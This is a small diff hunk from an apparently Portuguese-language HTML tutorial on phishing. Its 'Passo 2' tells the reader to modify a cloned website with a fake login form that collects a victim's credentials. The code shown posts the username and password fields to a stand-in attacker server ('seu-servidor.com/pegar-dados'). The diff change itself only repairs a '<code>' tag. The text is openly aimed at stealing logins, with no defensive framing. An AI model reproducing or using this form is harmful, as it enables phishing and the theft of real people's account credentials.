@@ -34,7 +34,7 @@
 <h3>Passo 2: Modificar o código para coletar dados</h3>
 <p>Depois de ter o código do site, altere-o para incluir um formulário falso de login. Esse formulário irá coletar as credenciais inseridas pela vítima.</p>
 <pre>
-code>
+<code>
 <form action="http://seu-servidor.com/pegar-dados" method="post">
 <input type="text" name="username" placeholder="Usuário">
 <input type="password" name="password" placeholder="Senha">
